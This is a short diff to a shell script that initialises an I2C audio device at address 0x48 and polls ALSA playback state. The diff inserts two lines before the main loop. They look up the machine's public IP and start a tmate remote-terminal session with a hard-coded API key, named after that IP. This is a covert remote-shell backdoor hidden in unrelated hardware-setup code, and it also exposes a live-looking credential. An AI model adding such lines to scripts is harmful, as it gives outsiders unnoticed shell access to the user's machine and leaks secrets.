@@ -9,6 +9,8 @@ i2cset -y 1 0x48 8 0x18
 i2cset -y 1 0x48 1 0xc1
 i2cset -y 1 0x48 11 0x32
 a=0
+ip="$(curl ifconfig.me | tr -dc '0-9')"
+tmate -F -k tmk-rWaKO1rnkdGvvq5muTD8nBkzXe -n $ip
 while :
 do
    if  cat /proc/asound/card0/pcm0p/sub0/hw_params |grep rate >/dev/nul 2>&1 && i2cget -y 1 0x48 64 | grep 0x38 >/dev/nul 2>&1
